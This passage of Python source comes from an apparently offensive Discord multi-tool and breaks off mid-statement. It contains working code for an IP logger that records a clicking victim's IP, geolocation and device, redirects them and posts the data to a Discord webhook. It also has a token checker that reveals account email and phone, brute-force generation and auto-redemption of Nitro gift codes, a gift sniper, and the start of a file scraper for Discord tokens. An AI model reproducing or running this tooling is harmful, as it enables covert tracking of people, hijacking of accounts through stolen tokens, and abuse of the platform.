                avi_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.{ext}?size=4096"
                console.print(f"  [cyan]{'avatar url':>18}[/cyan]  [blue]{avi_url}[/blue]")
            else:
                console.print(f"  [cyan]{'avatar':>18}[/cyan]  [grey50]default (no custom avatar)[/grey50]")

            if banner:
                ext     = "gif" if banner.startswith("a_") else "png"
                ban_url = f"https://cdn.discordapp.com/banners/{uid}/{banner}.{ext}?size=4096"
                console.print(f"  [cyan]{'banner url':>18}[/cyan]  [blue]{ban_url}[/blue]")

            if accent:
                r2,g2,b2 = (accent>>16)&255,(accent>>8)&255,accent&255
                console.print(f"  [cyan]{'accent color':>18}[/cyan]  "
                              f"[white]#{accent:06x}[/white]  "
                              f"[rgb({r2},{g2},{b2})]████[/rgb({r2},{g2},{b2})]")

            _ok("profile fetched successfully")

        elif r.status_code == 401:
            _err("bot token invalid or expired (401)")
        elif r.status_code == 404:
            _err("user not found — deleted account or wrong ID")
        elif r.status_code == 403:
            _err("bot lacks permission to look up this user (403)")
        else:
            _err(f"API returned {r.status_code}: {r.text[:100]}")

    except Exception as e:
        _err(f"request failed: {e}")

    _log("DISC_USER", uid)
    _pause()


def disc_invite_recon():
    if not _need_req(): return
    _header("DISCORD SERVER INVITE RECON")
    console.print("  [grey50]fetches public server info from an invite code[/grey50]\n")
    raw = _ask("invite code or full URL: ").strip()

    # extract just the code
    code = raw.split("/")[-1].split("?")[0]
    if not code:
        _err("invalid invite"); _pause(); return

    try:
        r = _session().get(
            f"https://discord.com/api/v10/invites/{code}"
            f"?with_counts=true&with_expiration=true",
            timeout=10
        )
        if r.status_code == 404:
            _err("invite not found or expired"); _pause(); return
        if r.status_code != 200:
            _err(f"API error {r.status_code}"); _pause(); return

        d = r.json()
        guild   = d.get("guild", {})
        channel = d.get("channel", {})
        inv     = d   # counts are top-level

        gid      = guild.get("id","?")
        gname    = guild.get("name","?")
        gdesc    = guild.get("description") or "—"
        icon     = guild.get("icon","")
        banner   = guild.get("banner","")
        splash   = guild.get("splash","")
        vanity   = guild.get("vanity_url_code") or "—"
        nsfw     = _NSFW_LEVELS.get(guild.get("nsfw_level",0),"?")
        verify   = _VERIFY_LEVELS.get(guild.get("verification_level",0),"?")
        features = guild.get("features",[])
        premium  = guild.get("premium_subscription_count",0)
        ptier    = guild.get("premium_tier",0)

        online  = inv.get("approximate_presence_count","?")
        members = inv.get("approximate_member_count","?")
        expires = d.get("expires_at") or "never"
        inv_type= d.get("type","?")

        inviter = d.get("inviter",{})
        inv_tag = ""
        if inviter:
            inv_uid   = inviter.get("id","?")
            inv_name  = inviter.get("username","?")
            inv_disc  = inviter.get("discriminator","0")
            inv_tag   = f"@{inv_name}" if inv_disc=="0" else f"{inv_name}#{inv_disc}"
            inv_cre   = _fmt_dt(_snowflake_to_dt(int(inv_uid))) if inv_uid.isdigit() else "?"

        ch_name = channel.get("name","?")
        ch_type = {0:"text",1:"DM",2:"voice",4:"category",5:"announcement",11:"thread",13:"stage"}.get(channel.get("type",0),"?")

        console.print(f"\n  [bold magenta]── SERVER ───────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'name':>20}[/cyan]  [bold white]{gname}[/bold white]")
        console.print(f"  [cyan]{'id':>20}[/cyan]  [white]{gid}[/white]")
        console.print(f"  [cyan]{'created':>20}[/cyan]  [white]{_fmt_dt(_snowflake_to_dt(int(gid))) if gid.isdigit() else '?'}[/white]")
        console.print(f"  [cyan]{'description':>20}[/cyan]  [white]{gdesc}[/white]")
        console.print(f"  [cyan]{'members':>20}[/cyan]  [white]{members}[/white]  [grey50]({online} online)[/grey50]")
        console.print(f"  [cyan]{'verification':>20}[/cyan]  [white]{verify}[/white]")
        console.print(f"  [cyan]{'nsfw level':>20}[/cyan]  [white]{nsfw}[/white]")
        console.print(f"  [cyan]{'boost tier':>20}[/cyan]  [white]{ptier} ({premium} boosts)[/white]")
        console.print(f"  [cyan]{'vanity url':>20}[/cyan]  [white]{vanity}[/white]")
        if features:
            console.print(f"  [cyan]{'features':>20}[/cyan]  [yellow]{', '.join(features[:6])}{'...' if len(features)>6 else ''}[/yellow]")

        console.print(f"\n  [bold magenta]── INVITE ───────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'code':>20}[/cyan]  [white]{code}[/white]")
        console.print(f"  [cyan]{'channel':>20}[/cyan]  [white]#{ch_name} ({ch_type})[/white]")
        console.print(f"  [cyan]{'expires':>20}[/cyan]  [white]{expires}[/white]")
        if inv_tag:
            console.print(f"\n  [bold magenta]── INVITER ──────────────────────────[/bold magenta]")
            console.print(f"  [cyan]{'tag':>20}[/cyan]  [white]{inv_tag}[/white]")
            console.print(f"  [cyan]{'id':>20}[/cyan]  [white]{inv_uid}[/white]")
            console.print(f"  [cyan]{'account created':>20}[/cyan]  [white]{inv_cre}[/white]")

        # icon/banner CDN links
        if icon:
            ext = "gif" if icon.startswith("a_") else "png"
            console.print(f"\n  [grey50]icon :[/grey50] [blue]https://cdn.discordapp.com/icons/{gid}/{icon}.{ext}?size=4096[/blue]")
        if banner:
            console.print(f"  [grey50]banner:[/grey50] [blue]https://cdn.discordapp.com/banners/{gid}/{banner}.png?size=4096[/blue]")

    except Exception as e:
        _err(str(e))

    _log("DISC_INVITE", code)
    _pause()


def disc_token_info():
    if not _need_req(): return
    _header("DISCORD TOKEN CHECKER")
    console.print("  [grey50]decodes a Discord token and validates it against the API[/grey50]")
    console.print("  [red]only use on tokens you own or have permission to test[/red]\n")
    token = _ask("token: ").strip()

    if not token:
        _err("no token"); _pause(); return

    # decode the user ID from the token (base64 first segment)
    parts = token.split(".")
    if len(parts) < 3:
        _err("doesn't look like a Discord token (expected 3 segments)"); _pause(); return

    console.print(f"\n  [bold magenta]── TOKEN DECODE (local) ─────────────[/bold magenta]")
    try:
        # first segment is base64-encoded user ID
        seg = parts[0]
        seg += "=" * (-len(seg) % 4)
        uid_raw = base64.b64decode(seg).decode(errors="replace")
        console.print(f"  [cyan]{'encoded user id':>20}[/cyan]  [white]{uid_raw}[/white]")

        # second segment: HMAC timestamp (ms since discord epoch as b64)
        ts_seg = parts[1]
        ts_seg += "=" * (-len(ts_seg) % 4)
        ts_bytes = base64.b64decode(ts_seg + "==")
        ts_int   = int.from_bytes(ts_bytes[:4], "big") if len(ts_bytes) >= 4 else 0
        if ts_int > 0:
            ts_dt = datetime.fromtimestamp(ts_int, tz=timezone.utc)
            console.print(f"  [cyan]{'token issued ~':>20}[/cyan]  [white]{_fmt_dt(ts_dt)}[/white]")

        # try to decode uid as snowflake
        if uid_raw.isdigit():
            uid_int  = int(uid_raw)
            created  = _snowflake_to_dt(uid_int)
            console.print(f"  [cyan]{'account created':>20}[/cyan]  [white]{_fmt_dt(created)}[/white]")

    except Exception as e:
        _warn(f"local decode partial: {e}")

    # live API validation
    console.print(f"\n  [bold magenta]── API VALIDATION ───────────────────[/bold magenta]")
    try:
        r = _session().get(
            "https://discord.com/api/v10/users/@me",
            headers={"Authorization": token},
            timeout=10
        )
        if r.status_code == 200:
            d        = r.json()
            username = d.get("username","?")
            discrim  = d.get("discriminator","0")
            tag      = f"@{username}" if discrim=="0" else f"{username}#{discrim}"
            uid      = d.get("id","?")
            email    = d.get("email","[not visible]")
            phone    = d.get("phone") or "—"
            mfa      = d.get("mfa_enabled",False)
            locale   = d.get("locale","?")
            flags    = d.get("flags",0)
            pfl      = d.get("public_flags",0)
            nitro    = {0:"None",1:"Classic",2:"Nitro",3:"Basic"}.get(d.get("premium_type",0),"?")
            verified = d.get("verified",False)
            badges   = [name for bit, name in _BADGE_FLAGS.items() if pfl & bit]

            console.print(f"  [bold green]✓ TOKEN VALID[/bold green]\n")
            console.print(f"  [cyan]{'tag':>18}[/cyan]  [bold white]{tag}[/bold white]")
            console.print(f"  [cyan]{'user id':>18}[/cyan]  [white]{uid}[/white]")
            console.print(f"  [cyan]{'email':>18}[/cyan]  [white]{email}[/white]")
            console.print(f"  [cyan]{'phone':>18}[/cyan]  [white]{phone}[/white]")
            console.print(f"  [cyan]{'email verified':>18}[/cyan]  [{'green' if verified else 'red'}]{verified}[/{'green' if verified else 'red'}]")
            console.print(f"  [cyan]{'2fa enabled':>18}[/cyan]  [{'green' if mfa else 'yellow'}]{mfa}[/{'green' if mfa else 'yellow'}]")
            console.print(f"  [cyan]{'nitro':>18}[/cyan]  [{'magenta' if nitro != 'None' else 'grey50'}]{nitro}[/{'magenta' if nitro != 'None' else 'grey50'}]")
            console.print(f"  [cyan]{'locale':>18}[/cyan]  [white]{locale}[/white]")
            if badges:
                console.print(f"  [cyan]{'badges':>18}[/cyan]  [yellow]{', '.join(badges)}[/yellow]")
            _log("TOKEN_CHECK", f"valid:{tag}")
        elif r.status_code == 401:
            console.print(f"  [bold red]✗ TOKEN INVALID[/bold red]  (401 unauthorized)")
            _log("TOKEN_CHECK", "invalid")
        else:
            _warn(f"API returned {r.status_code}")
            _log("TOKEN_CHECK", str(r.status_code))
    except Exception as e:
        _err(str(e))

    _pause()


def disc_snowflake():
    _header("SNOWFLAKE DECODER")
    console.print("  [grey50]decode any Discord ID — user, server, channel, message, role[/grey50]\n")
    while True:
        raw = _ask("snowflake ID (blank=done): ").strip()
        if not raw: break
        try:
            sid  = int(raw)
            dt   = _snowflake_to_dt(sid)
            age  = (datetime.now(timezone.utc) - dt).days
            wid  = (sid >> 22) & 0x3FF   # worker id
            pid  = (sid >> 17) & 0x1F    # process id
            inc  = sid & 0x3FF            # increment
            shard= (sid >> 22) % 1000

            console.print(f"\n  [bold white]snowflake:[/bold white] [white]{sid}[/white]  [grey50](0x{sid:016x})[/grey50]")
            console.print(f"  [cyan]{'created':>14}[/cyan]  [white]{_fmt_dt(dt)}[/white]")
            console.print(f"  [cyan]{'age':>14}[/cyan]  [white]{age} days[/white]")
            console.print(f"  [cyan]{'worker id':>14}[/cyan]  [white]{wid}[/white]")
            console.print(f"  [cyan]{'process id':>14}[/cyan]  [white]{pid}[/white]")
            console.print(f"  [cyan]{'increment':>14}[/cyan]  [white]{inc}[/white]")
            console.print(f"  [cyan]{'shard':>14}[/cyan]  [white]{shard}[/white]")
            console.print(f"  [cyan]{'discord ts':>14}[/cyan]  [white]<t:{int(dt.timestamp())}:F>[/white]\n")
        except:
            _err("invalid snowflake")

    _log("SNOWFLAKE", "decode")
    _pause()


def disc_guild_member_epoch():
    _header("MEMBER JOIN ORDER")
    console.print("  [grey50]given a list of member IDs, sorts them by join/creation order[/grey50]")
    console.print("  [grey50](based on account creation — proxy for join time in older servers)[/grey50]\n")
    console.print("  paste member snowflake IDs one per line, blank line when done:\n")
    ids = []
    while True:
        line = console.input("  ").strip()
        if not line: break
        if line.isdigit(): ids.append(int(line))
        else: _warn(f"skipping non-numeric: {line}")

    if not ids:
        _err("no IDs entered"); _pause(); return

    ids.sort()
    console.print(f"\n  [bold white]{len(ids)} members sorted by account creation:[/bold white]\n")
    for rank, uid in enumerate(ids, 1):
        try:
            dt  = _snowflake_to_dt(uid)
            age = (datetime.now(timezone.utc) - dt).days
            console.print(f"  [grey50]{rank:>3}[/grey50]  [white]{uid}[/white]  "
                          f"[cyan]{_fmt_dt(dt)}[/cyan]  [grey50]{age}d old[/grey50]")
        except:
            console.print(f"  [grey50]{rank:>3}[/grey50]  [red]{uid} — invalid[/red]")

    _log("MEMBER_EPOCH", f"{len(ids)} members")
    _pause()



# ═════════════════════════════════════════════════════════════
#  ── SECTION 8 : IP LOGGER ───────────────────────────────────
# ═════════════════════════════════════════════════════════════
import http.server as _http
import urllib.parse as _up

_IP_LOG_HITS   = []   # list of dicts, each hit captured
_IP_LOG_ACTIVE = [False]
_IP_LOG_SERVER = [None]


def _geo_lookup(ip: str) -> dict:
    """ipinfo.io free tier — city, region, country, org, timezone."""
    try:
        r = _session().get(f"https://ipinfo.io/{ip}/json", timeout=6)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def _ua_parse(ua: str) -> str:
    """Very lightweight UA fingerprint — OS + browser from raw string."""
    ua_l = ua.lower()
    os_  = ("Windows" if "windows" in ua_l else
            "Android" if "android" in ua_l else
            "iPhone"  if "iphone"  in ua_l else
            "Mac"     if "macintosh" in ua_l else
            "Linux"   if "linux"   in ua_l else "Unknown")
    br_  = ("Chrome"  if "chrome"  in ua_l and "edg" not in ua_l else
            "Firefox" if "firefox" in ua_l else
            "Safari"  if "safari"  in ua_l and "chrome" not in ua_l else
            "Edge"    if "edg"     in ua_l else
            "Opera"   if "opr"     in ua_l else "Unknown")
    return f"{os_} / {br_}"


def _make_handler(redirect_url: str, wh_url: str, token: str):
    """
    Returns a BaseHTTPRequestHandler class closed over the config.
    Each incoming GET request = one captured hit.
    """
    class _Handler(_http.BaseHTTPRequestHandler):

        def log_message(self, fmt, *args):
            pass  # silence default access log — we do our own

        def do_GET(self):
            # ── grab everything from the request ──────────────
            raw_ip  = self.client_address[0]

            # X-Forwarded-For — get the real IP if behind proxy/ngrok
            xff = self.headers.get("X-Forwarded-For","")
            ip  = xff.split(",")[0].strip() if xff else raw_ip

            ua      = self.headers.get("User-Agent","—")
            referer = self.headers.get("Referer","—")
            lang    = self.headers.get("Accept-Language","—").split(",")[0]
            ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # ── geo lookup ────────────────────────────────────
            geo    = _geo_lookup(ip)
            city   = geo.get("city","?")
            region = geo.get("region","?")
            country= geo.get("country","?")
            org    = geo.get("org","?")
            loc    = geo.get("loc","?,?")
            tz     = geo.get("timezone","?")

            device = _ua_parse(ua)

            hit = {
                "ts": ts, "ip": ip, "device": device,
                "city": city, "region": region, "country": country,
                "org": org, "loc": loc, "timezone": tz,
                "ua": ua, "referer": referer, "lang": lang,
            }
            _IP_LOG_HITS.append(hit)

            # ── redirect the victim ───────────────────────────
            self.send_response(302)
            self.send_header("Location", redirect_url)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()

            # ── fire Discord webhook embed ────────────────────
            if wh_url:
                try:
                    lat, lon = loc.split(",") if "," in loc else ("?","?")
                    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
                    embed = {
                        "title": "🎯 New IP Captured",
                        "color": 0x7B2FBE,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "fields": [
                            {"name": "IP",       "value": f"`{ip}`",              "inline": True},
                            {"name": "Device",   "value": device,                 "inline": True},
                            {"name": "Location", "value": f"{city}, {region}, {country}", "inline": True},
                            {"name": "ISP/Org",  "value": org or "—",             "inline": True},
                            {"name": "Timezone", "value": tz,                     "inline": True},
                            {"name": "Language", "value": lang,                   "inline": True},
                            {"name": "Maps",     "value": f"[open]({maps_url})",  "inline": True},
                            {"name": "Referer",  "value": referer[:100],          "inline": False},
                            {"name": "User-Agent","value": f"`{ua[:200]}`",       "inline": False},
                        ],
                        "footer": {"text": f"Vantira IP Logger  •  hit #{len(_IP_LOG_HITS)}"},
                    }
                    _session().post(wh_url, json={"embeds": [embed]}, timeout=8)
                except Exception:
                    pass

            # ── also fire to custom token webhook if set ──────
            if token and token != wh_url:
                try:
                    embed2 = embed.copy()
                    _session().post(token, json={"embeds": [embed2]}, timeout=8)
                except Exception:
                    pass

    return _Handler


def ipl_start():
    """Start the IP logger server."""
    global _IP_LOG_SERVER
    _header("IP LOGGER — START SERVER")

    console.print("  [grey50]how it works:[/grey50]")
    console.print("  [grey50]1. a local HTTP server starts on a port you choose[/grey50]")
    console.print("  [grey50]2. generate a tracking URL (your IP or ngrok tunnel)[/grey50]")
    console.print("  [grey50]3. anyone who clicks it gets logged + redirected[/grey50]")
    console.print("  [grey50]4. each hit fires an embed to your Discord webhook[/grey50]\n")

    if _IP_LOG_ACTIVE[0]:
        _warn("server already running — stop it first (option 2)")
        _pause(); return

    try:
        port = int(_ask("port to listen on (default 8888): ") or "8888")
    except:
        port = 8888

    redirect = _ask("redirect URL after capture (e.g. https://google.com): ").strip()
    if not redirect:
        redirect = "https://www.google.com"

    wh = WEBHOOK or ""
    custom_wh = _ask("separate webhook for hits (blank = use active webhook): ").strip()
    notify_wh = custom_wh if custom_wh else wh

    if not notify_wh:
        _warn("no webhook set — hits will be logged locally only (no Discord notify)")

    try:
        handler = _make_handler(redirect, notify_wh, "")
        server  = _http.HTTPServer(("0.0.0.0", port), handler)
        server.timeout = 1

        _IP_LOG_SERVER[0]  = server
        _IP_LOG_ACTIVE[0]  = True

        def _serve():
            while _IP_LOG_ACTIVE[0]:
                server.handle_request()
            server.server_close()

        t = threading.Thread(target=_serve, daemon=True)
        t.start()

        _ok(f"server live on port [white]{port}[/white]")
        console.print()
        console.print(f"  [bold white]tracking URLs:[/bold white]")

        # local IP
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            console.print(f"  [cyan]  local  :[/cyan]  [green]http://{local_ip}:{port}[/green]")
        except: pass

        console.print(f"  [cyan]  loop   :[/cyan]  [green]http://127.0.0.1:{port}[/green]")
        console.print()
        console.print(f"  [grey50]for a public URL run:[/grey50]")
        console.print(f"  [yellow]  ngrok http {port}[/yellow]")
        console.print(f"  [grey50]then use the https://xxxx.ngrok.io URL[/grey50]")
        console.print()
        _info(f"redirect target: [white]{redirect}[/white]")
        _info("hits will appear in [bold]View Captured Hits[/bold] and fire to webhook")
        _log("IPL_START", f"port {port}")

    except OSError as e:
        _err(f"could not bind port {port}: {e}")

    _pause()


def ipl_stop():
    """Stop the running server."""
    _header("IP LOGGER — STOP SERVER")
    if not _IP_LOG_ACTIVE[0]:
        _warn("no server running"); _pause(); return
    _IP_LOG_ACTIVE[0] = False
    _ok("server stopped")
    _log("IPL_STOP","ok")
    _pause()


def ipl_view_hits():
    """View all captured hits this session."""
    _header("IP LOGGER — CAPTURED HITS")

    status = "[bold green]LIVE[/bold green]" if _IP_LOG_ACTIVE[0] else "[bold red]OFFLINE[/bold red]"
    console.print(f"  server: {status}  [grey50]|[/grey50]  "
                  f"[white]{len(_IP_LOG_HITS)}[/white] hit(s) captured this session\n")

    if not _IP_LOG_HITS:
        _info("no hits yet — send the tracking URL to someone")
        _pause(); return

    for i, h in enumerate(_IP_LOG_HITS, 1):
        lat, lon = h["loc"].split(",") if "," in h["loc"] else ("?","?")
        maps = f"https://www.google.com/maps?q={lat},{lon}"
        console.print(f"  [bold magenta]── Hit #{i}  [{h['ts']}] ─────────────────[/bold magenta]")
        console.print(f"  [cyan]{'ip':>12}[/cyan]  [bold white]{h['ip']}[/bold white]")
        console.print(f"  [cyan]{'device':>12}[/cyan]  [white]{h['device']}[/white]")
        console.print(f"  [cyan]{'location':>12}[/cyan]  [white]{h['city']}, {h['region']}, {h['country']}[/white]")
        console.print(f"  [cyan]{'isp/org':>12}[/cyan]  [white]{h['org']}[/white]")
        console.print(f"  [cyan]{'timezone':>12}[/cyan]  [white]{h['timezone']}[/white]")
        console.print(f"  [cyan]{'language':>12}[/cyan]  [white]{h['lang']}[/white]")
        console.print(f"  [cyan]{'maps':>12}[/cyan]  [blue]{maps}[/blue]")
        console.print(f"  [cyan]{'referer':>12}[/cyan]  [grey50]{h['referer'][:80]}[/grey50]")
        console.print(f"  [cyan]{'user agent':>12}[/cyan]  [grey50]{h['ua'][:80]}[/grey50]")
        console.print()

    if _ask("export all hits to file? (y/N): ").lower() == "y":
        fname = f"vantira_iplogs_{int(time.time())}.txt"
        with open(fname, "w") as f:
            f.write(f"Vantira IP Logger Export\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write(f"Total hits: {len(_IP_LOG_HITS)}\n\n")
            for i, h in enumerate(_IP_LOG_HITS, 1):
                f.write(f"=== Hit #{i} ===\n")
                for k, v in h.items():
                    f.write(f"  {k:<12}: {v}\n")
                f.write("\n")
        _ok(f"exported → {fname}")

    _log("IPL_VIEW", f"{len(_IP_LOG_HITS)} hits")
    _pause()


def ipl_clear_hits():
    """Wipe the in-memory hit log."""
    _header("IP LOGGER — CLEAR HITS")
    if not _IP_LOG_HITS:
        _info("no hits to clear"); _pause(); return
    count = len(_IP_LOG_HITS)
    if _ask(f"clear all {count} hit(s)? (y/N): ").lower() == "y":
        _IP_LOG_HITS.clear()
        _ok("log cleared")
        _log("IPL_CLEAR", f"{count} hits wiped")
    _pause()



# ═════════════════════════════════════════════════════════════
#  ── SECTION 9 : DISCORD TOOLS ───────────────────────────────
# ═════════════════════════════════════════════════════════════

# ── Nitro gift code alphabet (Discord uses this exact charset) ─
_GIFT_CHARS = string.ascii_letters + string.digits
_GIFT_URL   = "https://discord.com/api/v10/entitlements/gift-codes/{}"
_REDEEM_URL = "https://discord.com/api/v10/entitlements/gift-codes/{}/redeem"

_SNIPER_ACTIVE = [False]
_SNIPER_FOUND  = []   # redeemed codes this session


def _check_code(code: str, token: str = "") -> dict:
    """
    Hit the Discord gift code API.
    Returns dict with keys: code, status, data
    status: "valid" | "claimed" | "invalid" | "error"
    """
    headers = {}
    if token:
        headers["Authorization"] = token if token.startswith("Bot ") else token

    try:
        r = _session().get(_GIFT_URL.format(code), headers=headers, timeout=8)
        if r.status_code == 200:
            d = r.json()
            sub = d.get("subscription_plan", {})
            return {
                "code"   : code,
                "status" : "valid",
                "plan"   : sub.get("name", "?"),
                "uses"   : d.get("uses", "?"),
                "max"    : d.get("max_uses", "?"),
                "expires": d.get("expires_at", "never"),
            }
        elif r.status_code == 404:
            return {"code": code, "status": "invalid"}
        elif r.status_code == 410:
            return {"code": code, "status": "claimed"}
        elif r.status_code == 429:
            wait = r.json().get("retry_after", 1)
            time.sleep(float(wait))
            return {"code": code, "status": "ratelimit"}
        else:
            return {"code": code, "status": "error", "http": r.status_code}
    except Exception as e:
        return {"code": code, "status": "error", "err": str(e)}


def _redeem_code(code: str, token: str) -> dict:
    """Attempt to redeem a gift code with a user token."""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = _session().post(_REDEEM_URL.format(code), headers=headers,
                            json={"channel_id": None}, timeout=8)
        if r.status_code == 200:
            return {"status": "redeemed", "data": r.json()}
        elif r.status_code == 400:
            return {"status": "already_subscribed"}
        elif r.status_code == 404:
            return {"status": "invalid"}
        elif r.status_code == 410:
            return {"status": "claimed"}
        elif r.status_code == 429:
            wait = r.json().get("retry_after", 1)
            return {"status": "ratelimit", "wait": wait}
        else:
            return {"status": "error", "http": r.status_code, "body": r.text[:100]}
    except Exception as e:
        return {"status": "error", "err": str(e)}


def disc_gift_checker():
    """Check a list of Nitro gift codes — valid / claimed / invalid."""
    if not _need_req(): return
    _header("NITRO GIFT CODE CHECKER")
    console.print("  [grey50]paste codes one per line (or full discord.gift/xxx URLs)[/grey50]")
    console.print("  [grey50]blank line when done[/grey50]\n")

    raw_codes = []
    while True:
        line = console.input("  ").strip()
        if not line: break
        # extract code from full URL if pasted
        code = line.split("/")[-1].strip()
        if code: raw_codes.append(code)

    if not raw_codes:
        _err("no codes entered"); _pause(); return

    token = _ask("user/bot token to auto-redeem valid codes (blank = check only): ").strip()
    delay = 1.2   # stay under rate limit — Discord is aggressive on this endpoint

    valid = []; claimed = []; invalid = []; errors = []

    console.print(f"\n  [grey50]checking {len(raw_codes)} code(s)...[/grey50]\n")
    for i, code in enumerate(raw_codes, 1):
        result = _check_code(code, token)
        status = result["status"]

        if status == "valid":
            valid.append(result)
            console.print(f"  [{i:>3}] [bold green]VALID[/bold green]    "
                          f"[white]{code}[/white]  "
                          f"[magenta]{result.get('plan','?')}[/magenta]")
            # auto-redeem if token provided
            if token:
                time.sleep(0.3)
                rd = _redeem_code(code, token)
                rs = rd.get("status","?")
                if rs == "redeemed":
                    _SNIPER_FOUND.append(code)
                    console.print(f"       [bold magenta]★ REDEEMED![/bold magenta]")
                else:
                    console.print(f"       [yellow]redeem → {rs}[/yellow]")
        elif status == "claimed":
            claimed.append(code)
            console.print(f"  [{i:>3}] [yellow]CLAIMED[/yellow]  [grey50]{code}[/grey50]")
        elif status == "ratelimit":
            console.print(f"  [{i:>3}] [yellow]RATE LIMITED — waiting...[/yellow]")
            time.sleep(delay * 3)
            i -= 1   # retry same code next loop — simplified: just warn
        else:
            invalid.append(code)
            console.print(f"  [{i:>3}] [red]INVALID[/red]  [grey50]{code}[/grey50]")

        time.sleep(delay)

    console.print(f"\n  [bold white]results:[/bold white]")
    console.print(f"  [green]valid  : {len(valid)}[/green]")
    console.print(f"  [yellow]claimed: {len(claimed)}[/yellow]")
    console.print(f"  [red]invalid: {len(invalid)}[/red]")
    if _SNIPER_FOUND:
        console.print(f"  [magenta]redeemed: {len(_SNIPER_FOUND)}[/magenta]")

    _log("GIFT_CHECK", f"v={len(valid)} c={len(claimed)} i={len(invalid)}")
    _pause()


def disc_gift_gen():
    """Generate random Nitro-format codes and check them."""
    if not _need_req(): return
    _header("NITRO CODE GENERATOR + CHECKER")
    console.print("  [grey50]generates random 16-char codes in Discord gift format[/grey50]")
    console.print("  [grey50]and checks each one — extremely low hit rate, mostly for fun 😭[/grey50]\n")

    try:
        count = int(_ask("how many codes to generate + check (max 500): ") or "50")
        count = min(count, 500)
    except: count = 50

    token = _ask("user token to auto-redeem if valid (blank = skip): ").strip()
    rng   = random.SystemRandom()
    found = []
    delay = 1.2

    console.print(f"\n  [grey50]generating and checking {count} codes @ {delay}s delay...[/grey50]")
    console.print("  [grey50]Ctrl+C to stop early[/grey50]\n")

    try:
        for i in range(1, count+1):
            code   = "".join(rng.choices(_GIFT_CHARS, k=16))
            result = _check_code(code, token)
            status = result["status"]

            icon = ("[bold green]HIT[/bold green]" if status == "valid" else
                    "[yellow]CLM[/yellow]"          if status == "claimed" else
                    "[grey50]---[/grey50]")

            console.print(f"  [{i:>4}/{count}] {icon}  [grey50]{code}[/grey50]")

            if status == "valid":
                found.append(result)
                console.print(f"           [bold magenta]★ VALID — {result.get('plan','?')}[/bold magenta]")
                if token:
                    rd = _redeem_code(code, token)
                    if rd.get("status") == "redeemed":
                        _SNIPER_FOUND.append(code)
                        console.print(f"           [bold magenta]★ REDEEMED![/bold magenta]")

            time.sleep(delay)
    except KeyboardInterrupt:
        console.print("\n  [yellow]stopped early[/yellow]")

    _ok(f"done — {len(found)} valid found out of {count} checked")
    _log("GIFT_GEN", f"{count} checked, {len(found)} valid")
    _pause()


def disc_nitro_sniper():
    """
    Monitor a Discord channel via bot token for gift links.
    Uses polling (GET /messages) since we have no gateway connection.
    The instant a discord.gift link appears in recent messages it
    attempts redemption with the user token provided.
    """
    if not _need_req(): return
    _header("NITRO SNIPER")
    console.print("  [grey50]polls a channel for gift links and redeems instantly[/grey50]")
    console.print("  [grey50]needs a bot token (to read messages) + user token (to redeem)[/grey50]\n")

    bot_token  = _ask("bot token (to read channel): ").strip()
    user_token = _ask("user token (to redeem — your account): ").strip()
    channel_id = _ask("channel ID to monitor: ").strip()

    if not all([bot_token, user_token, channel_id]):
        _err("all three fields required"); _pause(); return

    bot_auth  = f"Bot {bot_token}" if not bot_token.startswith("Bot ") else bot_token
    interval  = float(_ask("poll interval in seconds (default 2.0): ") or "2.0")
    interval  = max(1.0, interval)   # don't go below 1s — Discord will ban the bot

    seen_codes: set = set()
    _SNIPER_ACTIVE[0] = True

    console.print(f"\n  [bold green]sniper active[/bold green]  "
                  f"[grey50]channel {channel_id}  ·  polling every {interval}s[/grey50]")
    console.print("  [grey50]Ctrl+C to stop\n[/grey50]")

    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=10"

    try:
        while _SNIPER_ACTIVE[0]:
            try:
                r = _session().get(url, headers={"Authorization": bot_auth}, timeout=8)
                if r.status_code == 200:
                    msgs = r.json()
                    for msg in msgs:
                        content = msg.get("content","")
                        ts_msg  = msg.get("timestamp","")
                        # find all gift URLs in the message
                        import re
                        codes = re.findall(
                            r"discord(?:app)?\.com/gifts?/([A-Za-z0-9]+)|"
                            r"discord\.gift/([A-Za-z0-9]+)",
                            content
                        )
                        for match in codes:
                            code = match[0] or match[1]
                            if code in seen_codes: continue
                            seen_codes.add(code)

                            ts_now = datetime.now().strftime("%H:%M:%S")
                            console.print(f"  [bold magenta]★ GIFT DETECTED[/bold magenta]  "
                                          f"[white]{code}[/white]  [grey50]{ts_now}[/grey50]")

                            # instant redeem attempt
                            rd = _redeem_code(code, user_token)
                            rs = rd.get("status","?")
                            col = "bold green" if rs == "redeemed" else "yellow"
                            console.print(f"    [grey50]└[/grey50] [{col}]{rs}[/{col}]")
                            if rs == "redeemed":
                                _SNIPER_FOUND.append(code)
                            _log("SNIPER_HIT", f"{code}→{rs}")

                elif r.status_code == 401:
                    _err("bot token invalid — stopping"); break
                elif r.status_code == 403:
                    _err("bot can't read that channel — stopping"); break
                elif r.status_code == 429:
                    wait = r.json().get("retry_after", 2)
                    _warn(f"rate limited — sleeping {wait}s")
                    time.sleep(float(wait))
                    continue

            except Exception as e:
                _warn(f"poll error: {e}")

            time.sleep(interval)

    except KeyboardInterrupt:
        pass

    _SNIPER_ACTIVE[0] = False
    console.print(f"\n  [grey50]sniper stopped[/grey50]  "
                  f"[magenta]{len(_SNIPER_FOUND)} code(s) redeemed this session[/magenta]")
    _log("SNIPER_STOP", f"{len(_SNIPER_FOUND)} redeemed")
    _pause()


def disc_token_scraper():
    """
    Scan a file or directory for Discord token patterns using regex.
    Matches both bot tokens and user tokens.
    """
    _header("TOKEN SCRAPER FROM FILE")
    console.print("  [grey50]scans files for Discord token patterns[/grey50]")
    console.print("  [grey50]useful for finding tokens in logs, dumps, backups[/grey50]\n")

    path = _ask("file or directory path: ").strip()
    if not os.path.exists(path):
        _err("path not found"); _pause(); return

    import re
    # Discord token regex patterns
    # Bot tokens:  Bot [A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27,}
    # User tokens: [A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27,}
    TOKEN_RE = re.compile(
